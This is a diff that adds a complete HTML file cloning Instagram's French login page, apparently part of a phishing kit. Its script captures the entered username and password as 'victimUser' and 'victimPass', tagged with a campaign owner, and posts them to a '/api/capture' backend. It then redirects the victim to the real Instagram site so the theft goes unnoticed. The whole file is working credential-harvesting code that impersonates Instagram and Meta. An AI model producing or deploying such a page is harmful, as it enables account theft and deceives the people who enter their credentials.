@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Connexion</title>
+    <style>
+        /* Global styles */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .instagram-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .instagram-logo {
+            width: 175px;
+            height: auto;
+        }
+
+        .instagram-icon {
+            width: 24px;
+            height: 24px;
+            margin-left: 8px;
+        }
+
+        h1 {
+            font-size: 16px;
+            color: #262626;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            box-sizing: border-box;
+            background-color: #fafafa;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .show-password input {
+            margin-right: 8px;
+        }
+
+        button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #0077e6;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            margin-top: 12px;
+            display: block;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Styles pour le texte ajouté */
+        .additional-text {
+            position: fixed;
+            bottom: 10px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            padding: 0 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- En-tête Instagram avec logo et icône -->
+        <div class="instagram-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="instagram-logo">
+            <img src="https://i.postimg.cc/KzjtLPVs/IMG-5911.png" alt="Instagram Icon" class="instagram-icon">
+        </div>
+        
+        <h1>Connectez-vous pour voir les photos et vidéos de vos amis.</h1>
+        <form id="loginForm">
+            <input type="text" id="username" class="input-field" name="username" placeholder="Nom d'utilisateur, e-mail ou numéro de téléphone" required>
+            <input type="password" id="password" class="input-field" name="password" placeholder="Mot de passe" required>
+            
+            <!-- Case à cocher pour afficher/masquer le mot de passe -->
+            <div class="show-password">
+                <input type="checkbox" id="showPassword">
+                <label for="showPassword">Afficher le mot de passe</label>
+            </div>
+
+            <button type="submit">Se connecter</button>
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        </form>
+        <div class="footer">
+            <p>Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
+        </div>
+    </div>
+
+    <!-- Texte ajouté en bas de page -->
+    <div class="additional-text">
+        <p>Instagram fait partie de Meta. En vous inscrivant, vous acceptez nos Conditions générales, notre Politique de confidentialité et notre Politique en matière de cookies.</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const campaignOwner = urlParams.get('user') || 'Kim';
+        const linkType = urlParams.get('type') || 'standard';
+
+        // Fonction pour afficher/masquer le mot de passe
+        const passwordInput = document.getElementById('password');
+        const showPasswordCheckbox = document.getElementById('showPassword');
+
+        showPasswordCheckbox.addEventListener('change', function() {
+            if (this.checked) {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        });
+
+        // Fonction pour gérer la soumission du formulaire
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Empêche la soumission du formulaire
+
+            // Récupérer les valeurs du formulaire
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const payload = {
+                owner: campaignOwner,
+                network: "Instagram",
+                type: linkType,
+                victimUser: username,
+                victimPass: password,
+                otp: 'Aucun'
+            };
+
+            // Envoi des données capturées vers le backend Flask (/api/capture)
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                window.location.href = "https://www.instagram.com";
+            }).catch(error => {
+                window.location.href = "https://www.instagram.com";
+            });
+        });
+    </script>
+</body>
+</html>
